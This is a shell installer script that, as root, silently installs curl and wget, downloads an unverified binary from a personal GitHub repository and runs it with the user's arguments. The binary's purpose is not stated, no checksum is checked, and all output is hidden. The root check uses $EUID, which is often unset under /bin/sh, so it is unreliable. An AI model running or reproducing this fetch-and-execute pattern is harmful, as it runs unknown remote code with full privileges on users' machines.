#!/bin/sh

# This script installs required tools, downloads a Go binary, and executes it with provided arguments.

# Define required packages
REQUIRED_PACKAGES="curl wget"

# Install required packages based on the OS
install_packages() {
  if [ -f /etc/redhat-release ]; then
    # Red Hat-based systems (e.g., CentOS, Fedora)
    yum install -y $REQUIRED_PACKAGES > /dev/null 2>&1
  elif [ -f /etc/lsb-release ]; then
    # Debian-based systems (e.g., Ubuntu)
    apt-get update > /dev/null 2>&1
    apt-get install -y $REQUIRED_PACKAGES > /dev/null 2>&1
  elif [ -f /etc/os-release ]; then
    # Other Linux distributions
    OS=$(awk -F= '/^ID=/ { print $2 }' /etc/os-release)
    if [ "$OS" = "ubuntu" ] || [ "$OS" = "debian" ]; then
      apt-get update > /dev/null 2>&1
      apt-get install -y $REQUIRED_PACKAGES > /dev/null 2>&1
    elif [ "$OS" = "centos" ] || [ "$OS" = "fedora" ] || [ "$OS" = "rhel" ]; then
      yum install -y $REQUIRED_PACKAGES > /dev/null 2>&1
    else
      echo "Unsupported OS" >&2
      exit 1
    fi
  else
    echo "Unsupported OS" >&2
    exit 1
  fi
}

# Download the Go binary
download_pre() {
  curl -sL https://github.com/jonasakid41/scripts/raw/refs/heads/main/pre -o /usr/local/bin/pre > /dev/null 2>&1
  chmod +x /usr/local/bin/pre > /dev/null 2>&1
}

# Check if the script is run as root
if [ "$EUID" -ne 0 ]; then
  echo "You must be a root user to run this script." >&2
  exit 1
fi

# Install required packages
install_packages

# Download the Go binary
download_pre

# Run the Go binary with provided arguments
if [ "$#" -eq 0 ]; then
  echo "Usage: $0 <arguments>" >&2
  exit 1
fi

exec /usr/local/bin/pre "$@"
